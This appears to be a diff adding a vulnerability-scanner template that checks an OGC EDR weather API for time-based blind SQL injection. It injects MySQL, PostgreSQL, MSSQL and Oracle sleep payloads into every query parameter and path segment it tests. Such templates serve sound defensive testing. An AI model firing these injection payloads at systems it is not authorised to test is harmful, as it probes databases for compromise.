@@ -1,0 +1,172 @@
+id: ogc-edr-sqli-time-based
+
+info:
+  name: OGC EDR API Blind SQL Injection (Time-Based)
+  author: weather-wms-security
+  severity: critical
+  description: |
+    Detects blind SQL injection vulnerabilities in EDR API parameters using
+    time-based techniques. Tests multiple database-specific sleep functions.
+    A response time >= 5 seconds indicates a potential vulnerability.
+  reference:
+    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+    - https://ogcapi.ogc.org/edr/
+  tags: sqli,blind,time-based,edr,ogc,critical,api
+
+variables:
+  base_collection: "hrrr-surface"
+  base_coords: "POINT(-104.5 39.5)"
+  base_param: "GUST"
+
+http:
+  # Time-based SQLi in collectionId
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{payload}}"
+
+    payloads:
+      payload:
+        # MySQL
+        - "{{base_collection}}' AND SLEEP(5)--"
+        - "{{base_collection}}' AND SLEEP(5) AND '1'='1"
+        - "{{base_collection}}'; SELECT SLEEP(5)--"
+        # PostgreSQL
+        - "{{base_collection}}' AND pg_sleep(5)--"
+        - "{{base_collection}}'; SELECT pg_sleep(5)--"
+        # MSSQL
+        - "{{base_collection}}'; WAITFOR DELAY '0:0:5'--"
+        # Oracle
+        - "{{base_collection}}'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in coords parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "POINT(-104.5 39.5)' AND SLEEP(5)--"
+        - "POINT(-104.5 39.5)' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in parameter-name
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "{{base_param}}' AND SLEEP(5)--"
+        - "{{base_param}}' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in datetime
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{base_param}}&datetime={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "2024-01-01T00:00:00Z' AND SLEEP(5)--"
+        - "2024-01-01' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in z (vertical level)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{base_param}}&z={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "850' AND SLEEP(5)--"
+        - "850' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in within (radius)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/radius?coords={{base_coords}}&within={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "100' AND SLEEP(5)--"
+        - "100' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in bbox (cube)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/cube?bbox={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "-110,35,-100,40' AND SLEEP(5)--"
+        - "-110,35,-100,40' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in instanceId
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/instances/{{payload}}"
+
+    payloads:
+      payload:
+        - "latest' AND SLEEP(5)--"
+        - "latest' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
